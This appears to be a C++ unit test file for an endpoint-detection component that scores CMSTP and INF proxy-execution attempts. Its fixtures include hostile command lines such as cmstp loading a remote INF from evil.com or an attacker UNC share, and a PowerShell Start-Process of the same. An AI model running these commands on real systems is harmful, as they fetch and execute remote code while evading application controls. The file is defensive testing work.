/*
 * cmstp_bypass_detector_tests.cpp - Unit tests for CmstpBypassDetector
 * (T1218.003 / T1127 CMSTP / INF proxy execution).
 */
#include "cmstp_bypass_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "cmstp_bypass_detector.h"

namespace {

#define CB_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "cmstp bypass detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

edr::Event ScriptEvent(uint64_t ts100ns, const char* scriptText) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PS_SCRIPT";
    /* House contract: the PS script body lives ONLY in
     * kScriptBlockText, never kCommandLine. */
    event.fields[edr::field::kScriptBlockText] = scriptText;
    return event;
}

std::string Score(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kCmstpBypassScore);
    return it == event.fields.end() ? "" : it->second;
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunCmstpBypassDetectorTests() {
    std::fprintf(stderr, "[cmstp] TestDisabled\n");
    {
        edr::CmstpBypassDetector detector(false, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "C:\\Windows\\System32\\cmstp.exe",
            "cmstp /s http://evil.com/payload.inf");
        detector.Enrich(event);
        CB_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[cmstp] TestRemoteInf\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1001 * kSecond, "C:\\Windows\\System32\\cmstp.exe",
            "cmstp.exe /s http://evil.com/payload.inf");
        detector.Enrich(event);
        CB_CHECK(Score(event) == "90");
        CB_CHECK(event.fields.at(
            edr::field::kCmstpBypassVerdict) == "malicious");
    }
    std::fprintf(stderr, "[cmstp] TestUncInf\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1002 * kSecond, "C:\\Windows\\System32\\cmstp.exe",
            "cmstp /s \\\\attacker\\share\\setup.inf");
        detector.Enrich(event);
        CB_CHECK(Score(event) == "90");
    }
    std::fprintf(stderr, "[cmstp] TestWritableInf\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1003 * kSecond, "C:\\Windows\\System32\\cmstp.exe",
            "cmstp /s C:\\Users\\bob\\AppData\\Local\\Temp\\a.inf");
        detector.Enrich(event);
        CB_CHECK(Score(event) == "90");
    }
    std::fprintf(stderr, "[cmstp] TestLocalInf\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1004 * kSecond, "C:\\Windows\\System32\\cmstp.exe",
            "cmstp /s D:\\payloads\\setup.inf");
        detector.Enrich(event);
        CB_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[cmstp] TestBareNi\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1005 * kSecond, "C:\\Windows\\System32\\cmstp.exe",
            "cmstp /ni /s");
        detector.Enrich(event);
        CB_CHECK(Score(event) == "75");
    }
    std::fprintf(stderr, "[cmstp] TestCplWritable\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1006 * kSecond, "C:\\Windows\\System32\\control.exe",
            "control.exe C:\\Users\\Public\\evil.cpl");
        detector.Enrich(event);
        CB_CHECK(Score(event) == "75");
    }
    std::fprintf(stderr, "[cmstp] TestUnrelatedSilent\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1007 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell -enc AAAA");
        detector.Enrich(event);
        CB_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[cmstp] TestQueryChatterSilent\n");
    {
        /* Lines that merely mention cmstp while enumerating stay silent. */
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1008 * kSecond, "C:\\Windows\\System32\\cmd.exe",
            "reg query HKLM\\Software /f cmstp /s");
        detector.Enrich(event);
        CB_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[cmstp] TestPowerShellPlane\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(
            1009 * kSecond,
            "Start-Process cmstp -ArgumentList '/s http://evil.com/x.inf'");
        detector.Enrich(event);
        CB_CHECK(Score(event) == "90");
    }
    std::fprintf(stderr, "[cmstp] TestPowerShellNoBodySilent\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(1010 * kSecond, "");
        detector.Enrich(event);
        CB_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[cmstp] TestMinScoreGate\n");
    {
        edr::CmstpBypassDetector detector(true, 80, 300, 1024);
        edr::Event event = ProcEvent(
            1011 * kSecond, "C:\\Windows\\System32\\cmstp.exe",
            "cmstp /ni /s");
        detector.Enrich(event);
        CB_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[cmstp] TestDedupWindow\n");
    {
        edr::CmstpBypassDetector detector(true, 55, 300, 1024);
        const char* cmd = "cmstp /s http://evil.com/payload.inf";
        edr::Event first = ProcEvent(2000 * kSecond,
                                     "C:\\Windows\\System32\\cmstp.exe", cmd);
        detector.Enrich(first);
        CB_CHECK(Score(first) == "90");

        edr::Event dup = ProcEvent(2001 * kSecond,
                                   "C:\\Windows\\System32\\cmstp.exe", cmd);
        detector.Enrich(dup);
        CB_CHECK(Score(dup).empty());

        edr::Event later = ProcEvent(
            (2000 + 400) * kSecond,
            "C:\\Windows\\System32\\cmstp.exe", cmd);
        detector.Enrich(later);
        CB_CHECK(Score(later) == "90");
    }
    std::fprintf(stderr, "[cmstp] all passed\n");
}
